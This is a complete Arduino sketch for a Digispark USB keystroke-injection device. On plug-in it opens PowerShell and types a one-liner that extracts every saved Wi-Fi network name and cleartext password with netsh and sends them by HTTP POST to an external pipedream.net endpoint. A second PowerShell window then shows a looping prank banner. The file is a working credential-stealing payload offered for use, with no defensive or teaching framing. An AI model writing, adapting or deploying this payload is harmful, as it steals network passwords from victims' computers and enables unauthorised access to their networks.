#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print(F("netsh wlan show profiles | % {if ($_ -match \": (.+)\") {$s=$matches[1];$p=(netsh wlan show profile $s key=clear | sls \"Key Content\").ToString().Split(':')[1].Trim();irm https://eo46sldpibjsskq.m.pipedream.net -Method POST -Body \"SSID=$s`nPASS=$p\"}}; exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Second PowerShell session for loop
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(400);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(800);

  DigiKeyboard.print(F(
    "$hwnd=(Get-Process -Id $PID).MainWindowHandle;"
    "Add-Type '[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd,int n);' -Name W -Namespace U;"
    "[U.W]::ShowWindow($hwnd,3);"
    "$r=$host.ui.rawui;$r.FontSize=New-Object System.Management.Automation.Host.Size(50,20);"
    "while(1){1..10|%{Write-Host 'VIBE MON BOIEE SOOZHCHI' -f (Get-Random Red,Green,Yellow,Cyan,Magenta)};Write-Host 'CTRL+C to stop' -f White -b Red;sleep .3}"
  ));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
